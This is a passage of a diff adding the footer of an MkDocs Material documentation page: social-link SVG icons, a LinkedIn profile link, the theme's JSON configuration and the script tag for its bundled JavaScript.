+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M7.207 0c-.484 0-.877.102-1.182.3-.305.2-.46.463-.46.78v21.809c0 .277.159.528.476.76.315.234.703.351 1.166.351.443 0 .83-.117 1.168-.35.335-.231.506-.484.506-.761V1.08c0-.319-.163-.576-.49-.78C8.064.1 7.671 0 7.207 0zm9.523 8.662c-.483 0-.871.098-1.168.3l-4.439 2.783c-.199.186-.284.469-.247.855.034.383.21.747.524 1.09.314.347.666.563 1.068.655.396.09.697.041.896-.143l1.755-1.095v9.782c0 .277.153.528.461.76.3.234.687.351 1.15.351.463 0 .863-.117 1.199-.35.337-.233.506-.484.506-.761V9.739c0-.32-.165-.578-.49-.776-.325-.203-.73-.301-1.215-.301z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/agustinbaranowski/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["content.code.copy", "content.code.select", "content.code.annotate", "content.tabs.link", "content.footnote.tooltips", "content.tooltips", "navigation.instant", "navigation.instant.prefetch", "navigation.instant.progress", "navigation.indexes", "navigation.tabs.sticky", "navigation.path", "navigation.expand", "navigation.tracking", "navigation.top", "navigation.footer", "search", "search.suggest", "search.highlight", "search.share", "header.autohide"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.ad660dcc.min.js"></script>
+      
+    
+  </body>
+</html>
